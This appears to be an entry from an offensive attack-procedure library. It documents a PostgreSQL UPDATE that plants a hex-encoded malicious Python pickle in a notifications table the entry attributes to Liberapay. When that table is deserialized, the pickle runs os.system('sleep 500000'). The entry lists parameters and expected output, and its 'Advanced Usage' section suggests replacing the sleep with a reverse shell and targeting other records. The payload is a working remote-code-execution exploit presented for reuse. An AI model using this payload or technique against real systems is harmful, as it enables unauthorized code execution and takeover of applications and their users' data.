---
data: >-
  UPDATE notifications SET context =
  E'\x80027d710028580400000061736432710158030000006c6f6c71025801000000627103580500000033303030307104580100000063710563706f7369780a73797374656d0a7106580c000000736c656570203530303030307107857108527109752e'
  WHERE id = 43;
tags:
  - sqli
  - pickle
  - rce
type: command
executor: sql
platforms:
  - PostgreSQL
  - Web
id: ea706161-6114-4b84-b7d1-681f953d5e61
created_at: '2025-12-14T03:46:19.790Z'
updated_at: '2025-12-14T03:46:19.790Z'
verified: false
validated: true
submitted: true
---
# update-notifications-context-with-malicious-pickle

## Command

```sql
UPDATE notifications SET context = E'\x80027d710028580400000061736432710158030000006c6f6c71025801000000627103580500000033303030307104580100000063710563706f7369780a73797374656d0a7106580c000000736c656570203530303030307107857108527109752e' WHERE id = 43;
```

## Description

This SQL command updates the context field in the Liberapay notifications table with a hex-encoded malicious pickle payload, simulating injection via SQLi to enable RCE on deserialization.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `context` | Hex-encoded pickle bytes (E'...' for PostgreSQL escaping) | Yes |
| `id` | Notification record ID to target | Yes |

## Examples

### Basic Usage

```sql
UPDATE notifications SET context = E'\x80...' WHERE id = 43;
```

### Advanced Usage

Modify payload for different commands, e.g., replace sleep with reverse shell, and target different IDs.

```sql
UPDATE notifications SET context = E'[custom-hex-payload]' WHERE id = [target-id];
```

## Expected Output

Database update success message (e.g., UPDATE 1); no immediate execution. Upon deserialization, executes os.system('sleep 500000'), causing a hang.

## Related

- [[Related Procedure: Inject-Malicious-Pickle-Payload-via-SQL-Injection]]
